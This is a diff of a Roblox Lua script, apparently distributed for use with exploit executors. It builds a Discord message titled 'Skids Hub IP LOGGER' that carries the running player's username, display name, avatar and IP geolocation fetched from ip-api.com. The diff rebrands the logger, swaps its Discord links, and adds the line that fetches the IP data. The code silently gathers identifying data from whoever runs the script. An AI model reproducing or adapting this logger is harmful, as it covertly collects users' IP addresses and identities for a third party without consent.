@@ -17,19 +17,19 @@ do
             local player = game.Players.LocalPlayer
             local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
             local ipData = self.ipApi
-            scriptName = scriptName or 'EZ'
+            scriptName = scriptName or 'Logged someone'
             return {
                 content = string.format('**@%s** __fired__ **%s**', player.Name, scriptName),
                 embeds  = {
                     { 
                         author={
-                                name='Logger',
-                                url='https://discord.gg/gmJQNxbKpZ',
-                                icon_url='https://cdn.discordapp.com/attachments/874435126778552414/874436606793252935/804211903676940288.png'
+                                name='Logged someone epic',
+                                url='https://discord.gg/q8FspVseAU',
+                                icon_url='https://skidshubmx.000webhostapp.com/media/skids_HUB.png'
                         },
-                        title='Imagine **IP LOGGER**',
+                        title='Skids Hub **IP LOGGER**',
                         url='https://discord.gg/q8FspVseAU',
-                        description = string.format('@%s**(%s)** fired **%s** [discord](https://discord.gg/gmJQNxbKpZ)', player.Name, player.DisplayName, scriptName),
+                        description = string.format('@%s**(%s)** fired **%s** [discord](https://discord.gg/q8FspVseAU)', player.Name, player.DisplayName, scriptName),
                         color = 0,
                         fields  = {
                             {
@@ -72,13 +72,14 @@ do
                             },
                         },
                         footer = {
-                            text = 'Here',
-                            icon_url='https://cdn.discordapp.com/emojis/762821024592691221.png?v=1'
+                            text = 'Here is the info',
+                            icon_url='https://skidshubmx.000webhostapp.com/media/skids_HUB.png'
                         }
                     }
                 }
             }
         end,
+
         ipApi = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json')),
         exploitName = checkExploit(),
 
